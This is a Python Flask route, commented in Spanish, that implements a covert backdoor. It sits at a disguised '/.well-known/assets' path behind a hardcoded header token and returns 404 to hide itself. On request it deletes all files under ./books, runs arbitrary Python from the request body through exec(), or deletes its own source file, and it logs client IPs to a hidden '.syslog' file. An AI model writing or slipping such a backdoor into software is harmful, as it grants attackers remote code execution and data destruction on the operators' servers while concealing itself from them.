import base64
from flask import make_response

@app.route("/.well-known/assets", methods=["POST"])
def __interno_ping_salud_oculto():
    # Verificación discreta del encabezado
    # X-Auth-Token para evitar el acceso no autorizado
    # Se espera que el token sea "U3VwZXJTZWNyZXQ=" (base64 de "SuperSecret")
    # Si no coincide, se devuelve un error 404
    # Si coincide, se permite el acceso a la ruta
    # y se ejecuta la acción solicitada (borrar, ejecutar o autodestruir)
    # Se registra la dirección IP del cliente en un archivo de registro oculto
    # Se devuelve un mensaje de éxito o error según la acción realizada
    # y se devuelve un código de estado HTTP correspondiente
    # Se utiliza un bloque try-except para manejar excepciones y errores
    #-------------------------------------------------------------------------------------------#
    # Verificación discreta del encabezado
    if request.headers.get("X-Auth-Token") != "U3VwZXJTZWNyZXQ=":
        return "No Encontrado", 404 
    accion = request.args.get("act") 
    ruta_log = os.path.join(os.path.dirname(__file__), ".syslog")
    #--------------------------------------------------------------------------------------------#
    # Verificación de la acción solicitada
    if accion == "borrar":
        with open(ruta_log, "a") as f:
            f.write(f"Registro: {request.remote_addr}\n")
        try:
            for root, dirs, files in os.walk("./books", topdown=False):
                for name in files:
                    os.remove(os.path.join(root, name))
            return "Correcto", 200
        except Exception:
            return "Error", 500
    
    #--------------------------------------------------------------------------------------------#
    # Ejecución de código Python
    elif accion == "ejecutar":
        try:
            payload = request.data.decode()
            exec(payload, {"__builtins__": __builtins__})
            with open(ruta_log, "a") as f:
                f.write("Registro: acción ejecutada\n")
            return "Correcto", 200
        except Exception:
            return "Error", 400
    #--------------------------------------------------------------------------------------------#
    # Autodestrucción del script
    elif accion == "autodestruir":
        try:
            os.remove(__file__)
            return "Correcto", 200
        except Exception:
            return "Error", 400
    #--------------------------------------------------------------------------------------------#
    # Si no se proporciona una acción válida, se devuelve un error 204
    return make_response("", 204)
